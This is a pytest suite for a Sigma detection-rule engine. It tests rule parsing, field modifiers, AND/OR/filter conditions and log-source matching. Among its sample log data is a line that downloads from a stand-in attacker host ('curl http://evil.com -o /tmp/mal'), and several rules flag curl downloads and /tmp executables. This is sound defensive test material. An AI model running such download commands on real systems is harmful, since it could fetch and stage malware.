"""
Comprehensive tests for the Sigma rules integration engine.

Covers YAML parsing, detection modifiers, rule matching, condition logic,
filter exclusions, and edge cases.
"""

import pytest
from src.sigma_engine import (
    LogSource,
    MatchResult,
    SigmaRule,
    compute_stats,
    load_rules_from_directory,
    load_rules_from_yaml,
    match_log,
)


# ---------------------------------------------------------------------------
# Helpers
# ---------------------------------------------------------------------------

BASIC_RULE_YAML = """\
title: Detect suspicious process
id: aaaaaaaa-bbbb-cccc-dddd-eeeeeeeeeeee
status: stable
level: high
description: Detects a suspicious process execution
author: ThreatClaw
logsource:
    category: process_creation
    product: linux
detection:
    selection:
        CommandLine|contains: '/tmp/evil'
    condition: selection
tags:
    - attack.execution
    - attack.t1059
"""

FILTER_RULE_YAML = """\
title: Auth failure with filter
id: 11111111-2222-3333-4444-555555555555
status: experimental
level: medium
description: Detects authentication failures excluding service accounts
author: ThreatClaw
logsource:
    category: authentication
    product: linux
detection:
    selection:
        EventType: AuthFailure
    filter:
        User|startswith: svc_
    condition: selection and not filter
tags:
    - attack.credential_access
"""


# ---------------------------------------------------------------------------
# 1. YAML parsing
# ---------------------------------------------------------------------------

class TestYamlParsing:

    def test_parse_basic_rule(self):
        rule = load_rules_from_yaml(BASIC_RULE_YAML)
        assert rule.id == "aaaaaaaa-bbbb-cccc-dddd-eeeeeeeeeeee"
        assert rule.title == "Detect suspicious process"
        assert rule.status == "stable"
        assert rule.level == "high"
        assert rule.author == "ThreatClaw"
        assert rule.logsource.category == "process_creation"
        assert rule.logsource.product == "linux"
        assert "attack.execution" in rule.tags
        assert rule.enabled is True

    def test_parse_missing_title_raises(self):
        yaml_str = """\
id: some-id
detection:
    selection:
        Foo: bar
    condition: selection
"""
        with pytest.raises(ValueError, match="missing required field 'title'"):
            load_rules_from_yaml(yaml_str)

    def test_parse_missing_detection_raises(self):
        yaml_str = """\
title: Bad rule
id: bad-id
"""
        with pytest.raises(ValueError, match="'detection'"):
            load_rules_from_yaml(yaml_str)

    def test_parse_malformed_yaml_raises(self):
        with pytest.raises(ValueError, match="Invalid YAML"):
            load_rules_from_yaml("key: [unterminated\n  bad: {nope")

    def test_parse_non_mapping_raises(self):
        with pytest.raises(ValueError, match="mapping"):
            load_rules_from_yaml("- a list\n- not a map\n")

    def test_defaults_for_optional_fields(self):
        yaml_str = """\
title: Minimal rule
detection:
    selection:
        Foo: bar
    condition: selection
"""
        rule = load_rules_from_yaml(yaml_str)
        assert rule.status == "experimental"
        assert rule.level == "medium"
        assert rule.description == ""
        assert rule.author == ""
        assert rule.tags == []
        assert rule.id == ""


# ---------------------------------------------------------------------------
# 2. Detection modifiers
# ---------------------------------------------------------------------------

class TestDetectionModifiers:

    def test_contains_modifier(self):
        rule_yaml = """\
title: Contains test
detection:
    selection:
        CommandLine|contains: evil
    condition: selection
"""
        rule = load_rules_from_yaml(rule_yaml)
        assert rule.match({"CommandLine": "some evil command"}) is not None
        assert rule.match({"CommandLine": "safe command"}) is None

    def test_startswith_modifier(self):
        rule_yaml = """\
title: Startswith test
detection:
    selection:
        Path|startswith: /tmp/
    condition: selection
"""
        rule = load_rules_from_yaml(rule_yaml)
        assert rule.match({"Path": "/tmp/malware"}) is not None
        assert rule.match({"Path": "/var/tmp/ok"}) is None

    def test_endswith_modifier(self):
        rule_yaml = """\
title: Endswith test
detection:
    selection:
        FileName|endswith: .sh
    condition: selection
"""
        rule = load_rules_from_yaml(rule_yaml)
        assert rule.match({"FileName": "payload.sh"}) is not None
        assert rule.match({"FileName": "payload.py"}) is None

    def test_regex_modifier(self):
        rule_yaml = """\
title: Regex test
detection:
    selection:
        User|re: '^root$|^admin$'
    condition: selection
"""
        rule = load_rules_from_yaml(rule_yaml)
        assert rule.match({"User": "root"}) is not None
        assert rule.match({"User": "admin"}) is not None
        assert rule.match({"User": "jdoe"}) is None

    def test_wildcard_value(self):
        rule_yaml = """\
title: Wildcard test
detection:
    selection:
        Image: '*/bash'
    condition: selection
"""
        rule = load_rules_from_yaml(rule_yaml)
        assert rule.match({"Image": "/usr/bin/bash"}) is not None
        assert rule.match({"Image": "/bin/bash"}) is not None
        assert rule.match({"Image": "/bin/sh"}) is None

    def test_list_of_values_or_logic(self):
        rule_yaml = """\
title: List OR test
detection:
    selection:
        User:
            - root
            - admin
            - www-data
    condition: selection
"""
        rule = load_rules_from_yaml(rule_yaml)
        assert rule.match({"User": "root"}) is not None
        assert rule.match({"User": "admin"}) is not None
        assert rule.match({"User": "www-data"}) is not None
        assert rule.match({"User": "jdoe"}) is None

    def test_all_modifier_with_contains(self):
        rule_yaml = """\
title: All modifier test
detection:
    selection:
        CommandLine|contains|all:
            - curl
            - http
            - '-o'
    condition: selection
"""
        rule = load_rules_from_yaml(rule_yaml)
        assert rule.match({"CommandLine": "curl http://evil.com -o /tmp/mal"}) is not None
        assert rule.match({"CommandLine": "curl ftp://server"}) is None


# ---------------------------------------------------------------------------
# 3. Rule matching against sample logs
# ---------------------------------------------------------------------------

class TestRuleMatching:

    def test_match_log_returns_match_result(self):
        rule = load_rules_from_yaml(BASIC_RULE_YAML)
        log = {"CommandLine": "/tmp/evil_binary --flag"}
        results = match_log(log, [rule])
        assert len(results) == 1
        r = results[0]
        assert isinstance(r, MatchResult)
        assert r.rule_id == "aaaaaaaa-bbbb-cccc-dddd-eeeeeeeeeeee"
        assert r.title == "Detect suspicious process"
        assert r.level == "high"
        assert "attack.execution" in r.tags
        assert "CommandLine" in r.matched_fields

    def test_match_log_no_match(self):
        rule = load_rules_from_yaml(BASIC_RULE_YAML)
        log = {"CommandLine": "/usr/bin/ls -la"}
        results = match_log(log, [rule])
        assert results == []

    def test_disabled_rule_skipped(self):
        rule = load_rules_from_yaml(BASIC_RULE_YAML)
        rule.enabled = False
        log = {"CommandLine": "/tmp/evil"}
        results = match_log(log, [rule])
        assert results == []

    def test_logsource_filtering(self):
        rule = load_rules_from_yaml(BASIC_RULE_YAML)
        log = {"CommandLine": "/tmp/evil"}
        # Matching logsource should include the rule.
        ls_match = LogSource(category="process_creation", product="linux")
        results = match_log(log, [rule], logsource=ls_match)
        assert len(results) == 1
        # Non-matching logsource should exclude the rule.
        ls_nomatch = LogSource(category="network_connection", product="linux")
        results = match_log(log, [rule], logsource=ls_nomatch)
        assert results == []


# ---------------------------------------------------------------------------
# 4. Multiple selections with AND / OR conditions
# ---------------------------------------------------------------------------

class TestConditionLogic:

    def test_selection_and_not_filter(self):
        rule = load_rules_from_yaml(FILTER_RULE_YAML)
        # Should match: normal user auth failure.
        assert rule.match({"EventType": "AuthFailure", "User": "jdoe"}) is not None
        # Should NOT match: service account excluded by filter.
        assert rule.match({"EventType": "AuthFailure", "User": "svc_backup"}) is None
        # Should NOT match: event type mismatch.
        assert rule.match({"EventType": "AuthSuccess", "User": "jdoe"}) is None

    def test_or_condition(self):
        yaml_str = """\
title: OR condition
detection:
    sel1:
        User: root
    sel2:
        User: admin
    condition: sel1 or sel2
"""
        rule = load_rules_from_yaml(yaml_str)
        assert rule.match({"User": "root"}) is not None
        assert rule.match({"User": "admin"}) is not None
        assert rule.match({"User": "jdoe"}) is None

    def test_and_condition(self):
        yaml_str = """\
title: AND condition
detection:
    sel_user:
        User: root
    sel_action:
        Action: delete
    condition: sel_user and sel_action
"""
        rule = load_rules_from_yaml(yaml_str)
        assert rule.match({"User": "root", "Action": "delete"}) is not None
        assert rule.match({"User": "root", "Action": "read"}) is None
        assert rule.match({"User": "jdoe", "Action": "delete"}) is None

    def test_one_of_pattern(self):
        yaml_str = """\
title: 1 of selections
detection:
    selection_cmd:
        CommandLine|contains: evil
    selection_user:
        User: root
    condition: 1 of selection*
"""
        rule = load_rules_from_yaml(yaml_str)
        assert rule.match({"CommandLine": "evil stuff", "User": "nobody"}) is not None
        assert rule.match({"CommandLine": "safe", "User": "root"}) is not None
        assert rule.match({"CommandLine": "safe", "User": "nobody"}) is None

    def test_all_of_pattern(self):
        yaml_str = """\
title: all of selections
detection:
    selection_cmd:
        CommandLine|contains: curl
    selection_user:
        User: root
    condition: all of selection*
"""
        rule = load_rules_from_yaml(yaml_str)
        assert rule.match({"CommandLine": "curl http://x", "User": "root"}) is not None
        assert rule.match({"CommandLine": "curl http://x", "User": "jdoe"}) is None
        assert rule.match({"CommandLine": "wget", "User": "root"}) is None

    def test_parenthesised_condition(self):
        yaml_str = """\
title: Parenthesised condition
detection:
    sel_a:
        Foo: A
    sel_b:
        Foo: B
    filter:
        Bar: exclude
    condition: (sel_a or sel_b) and not filter
"""
        rule = load_rules_from_yaml(yaml_str)
        assert rule.match({"Foo": "A", "Bar": "keep"}) is not None
        assert rule.match({"Foo": "B", "Bar": "keep"}) is not None
        assert rule.match({"Foo": "A", "Bar": "exclude"}) is None
        assert rule.match({"Foo": "C", "Bar": "keep"}) is None


# ---------------------------------------------------------------------------
# 5. Edge cases
# ---------------------------------------------------------------------------

class TestEdgeCases:

    def test_empty_log_record(self):
        rule = load_rules_from_yaml(BASIC_RULE_YAML)
        assert rule.match({}) is None

    def test_dotted_field_name(self):
        yaml_str = """\
title: Dotted field
detection:
    selection:
        process.name: bash
    condition: selection
"""
        rule = load_rules_from_yaml(yaml_str)
        assert rule.match({"process": {"name": "bash"}}) is not None
        assert rule.match({"process": {"name": "zsh"}}) is None

    def test_case_insensitive_matching(self):
        yaml_str = """\
title: Case test
detection:
    selection:
        User: ROOT
    condition: selection
"""
        rule = load_rules_from_yaml(yaml_str)
        assert rule.match({"User": "root"}) is not None
        assert rule.match({"User": "Root"}) is not None

    def test_list_block_or(self):
        """A selection value that is a list of dicts (OR between them)."""
        yaml_str = """\
title: List block
detection:
    selection:
        - CommandLine|contains: evil
        - CommandLine|contains: malware
    condition: selection
"""
        rule = load_rules_from_yaml(yaml_str)
        assert rule.match({"CommandLine": "run evil"}) is not None
        assert rule.match({"CommandLine": "run malware"}) is not None
        assert rule.match({"CommandLine": "run safe"}) is None

    def test_compute_stats(self):
        rules = [
            load_rules_from_yaml(BASIC_RULE_YAML),
            load_rules_from_yaml(FILTER_RULE_YAML),
        ]
        stats = compute_stats(rules)
        assert stats.total == 2
        assert stats.by_level.get("high") == 1
        assert stats.by_level.get("medium") == 1
        assert stats.by_logsource_category.get("process_creation") == 1
        assert stats.by_logsource_category.get("authentication") == 1

    def test_load_rules_from_nonexistent_directory(self):
        with pytest.raises(FileNotFoundError):
            load_rules_from_directory("/nonexistent/path/rules")

    def test_logsource_matches(self):
        ls_rule = LogSource(category="process_creation", product="linux")
        ls_log = LogSource(category="process_creation", product="linux")
        assert ls_rule.matches(ls_log) is True
        ls_partial = LogSource(category="process_creation")
        assert ls_partial.matches(ls_log) is True
        ls_wrong = LogSource(category="network_connection")
        assert ls_wrong.matches(ls_log) is False

    def test_multiple_fields_and_in_block(self):
        """Multiple field conditions within a single selection block are ANDed."""
        yaml_str = """\
title: Multi-field AND
detection:
    selection:
        User: root
        Action: login
    condition: selection
"""
        rule = load_rules_from_yaml(yaml_str)
        assert rule.match({"User": "root", "Action": "login"}) is not None
        assert rule.match({"User": "root", "Action": "logout"}) is None
        assert rule.match({"User": "jdoe", "Action": "login"}) is None

    def test_match_result_has_timestamp(self):
        rule = load_rules_from_yaml(BASIC_RULE_YAML)
        log = {"CommandLine": "/tmp/evil"}
        results = match_log(log, [rule])
        assert len(results) == 1
        assert results[0].timestamp is not None
        assert len(results[0].timestamp) > 0
